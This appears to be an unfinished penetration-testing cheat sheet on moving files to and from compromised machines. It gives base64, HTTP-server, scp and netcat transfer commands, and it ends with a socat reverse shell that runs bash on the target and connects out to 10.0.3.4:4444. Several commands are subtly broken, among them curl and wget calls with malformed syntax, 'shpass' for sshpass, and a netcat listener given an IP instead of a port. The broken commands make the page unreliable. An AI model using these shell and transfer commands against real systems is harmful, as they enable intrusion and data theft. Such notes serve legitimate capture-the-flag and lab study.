---
description: On Construction
---

# 🐦 File Transfer

**Useful BInaries:**

{% embed url="https://github.com/andrew-d/static-binaries" %}

**Base64**

```bash
# Pipe to base64:
cat <file> | base64
# Save it in to a file
echo "texto_base_64" | base64 -d > <file>
```

**Http**

```bash
# Python
# Localy: 
python -m http.server 
# Remotely:
curl -o IP:Port/file

# Apache
# localy:
cp archivo.txt /var/www/html
# Remotely
wget IP/Port/file 
curl -o IP:Port/file
#Localy
python -m http.server 80
#Remotely
wget <ip>/<archivo>
```

**SSH**

```c
#scapy
shpass -p <password> scp <filename> admin@2million.htb:/tmp/
```

**Netcat**

```bash
# Target Machine
nc <Target_IP> <port> < file
# Locally
nc -lvp <Local_IP> > file

#Check hashes to avoid file corruption
md5sum <file>
#Use cat command
cat <file> | nc Target_IP 443
```

**Socat**

[socat](http://www.dest-unreach.org/socat/doc/socat.html) is like netcat on steroids and is a very powerfull networking swiss-army knife. Socat can be used to pass full TTY’s over TCP connections.

```
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444
#Target machine:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444


```
